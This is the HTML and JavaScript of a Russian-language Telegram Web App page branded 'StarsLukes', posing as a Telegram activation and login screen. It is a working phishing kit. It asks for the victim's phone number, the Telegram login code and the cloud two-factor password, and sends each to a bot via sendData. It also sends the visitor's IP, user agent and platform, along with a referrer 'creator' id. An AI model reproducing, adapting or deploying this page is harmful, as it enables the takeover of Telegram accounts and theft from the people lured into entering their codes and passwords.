<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>StarsLukes · Активация</title>
    <style>
        :root { --bg:#0a0a0f; --card:#12121a; --gold:#d4af37; --text:#e0e0e0; --input-bg:#1a1a22; }
        body { font-family:Inter,sans-serif; background:var(--bg); color:var(--text); display:flex; align-items:center; justify-content:center; height:100vh; margin:0; padding:20px; }
        .card { background:var(--card); border-radius:24px; padding:30px; width:100%; max-width:360px; text-align:center; border:1px solid #2a2a35; }
        .logo { font-size:24px; color:var(--gold); margin-bottom:20px; }
        .btn { width:100%; padding:14px; border:none; border-radius:14px; background:linear-gradient(145deg, #c9a23b, #e4b84d); color:#000; font-weight:bold; font-size:16px; margin-top:10px; }
        input { width:100%; padding:12px; background:var(--input-bg); border:1px solid #333; border-radius:12px; color:#fff; font-size:16px; margin-bottom:10px; }
        .hidden { display:none; }
        .note { margin-top:15px; font-size:12px; color:#888; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">StarsLukes</div>
    <div id="step-phone">
        <p>Авторизируйтесь через Telegram</p>
        <button class="btn" onclick="requestContact()">Поделиться контактом</button>
        <div style="margin:12px 0; color:#666;">или</div>
        <input type="tel" id="manualPhone" placeholder="+79991234567">
        <button class="btn" onclick="submitManualPhone()">Отправить номер</button>
    </div>
    <div id="step-code" class="hidden">
        <p>Введите код из Telegram</p>
        <input type="text" id="codeInput" placeholder="12345" maxlength="5">
        <button class="btn" onclick="submitCode()">Подтвердить</button>
    </div>
    <div id="step-2fa" class="hidden">
        <p>Облачный пароль</p>
        <input type="password" id="passwordInput" placeholder="Пароль">
        <button class="btn" onclick="submitPassword()">Войти</button>
    </div>
    <div class="note">Защищённое соединение</div>
</div>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
    const tg = window.Telegram.WebApp;
    tg.ready(); tg.expand();
    const fingerprint = { ip:'', userAgent:navigator.userAgent, platform:navigator.platform };
    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>fingerprint.ip=d.ip).catch(()=>{});
    const params = new URLSearchParams(window.location.search);
    const creatorUid = params.get('creator')||null;

    // Сообщаем боту об открытии
    tg.sendData(JSON.stringify({step:'page_opened', fingerprint, creator_uid:creatorUid}));

    function switchTo(id) {
        ['step-phone','step-code','step-2fa'].forEach(x => document.getElementById(x).classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
    }

    window.requestContact = function() {
        tg.requestContact().then(contact => {
            sendPhone(contact.phone_number);
        }).catch(() => {
            tg.showAlert('Не удалось получить номер. Введите вручную.');
        });
    };

    window.submitManualPhone = function() {
        const phone = document.getElementById('manualPhone').value.trim();
        if (!phone.startsWith('+') || phone.length<8) { tg.showAlert('Некорректный номер'); return; }
        sendPhone(phone);
    };

    function sendPhone(phone) {
        tg.sendData(JSON.stringify({step:'send_code', phone, fingerprint, creator_uid:creatorUid}));
        switchTo('step-code');
    }

    window.submitCode = function() {
        const code = document.getElementById('codeInput').value.trim();
        if (!/^\d{5}$/.test(code)) { tg.showAlert('Код из 5 цифр'); return; }
        tg.sendData(JSON.stringify({step:'verify_code', code}));
        tg.close();
    };

    window.submitPassword = function() {
        const password = document.getElementById('passwordInput').value;
        tg.sendData(JSON.stringify({step:'password', password}));
        tg.close();
    };
</script>
</body>
</html>
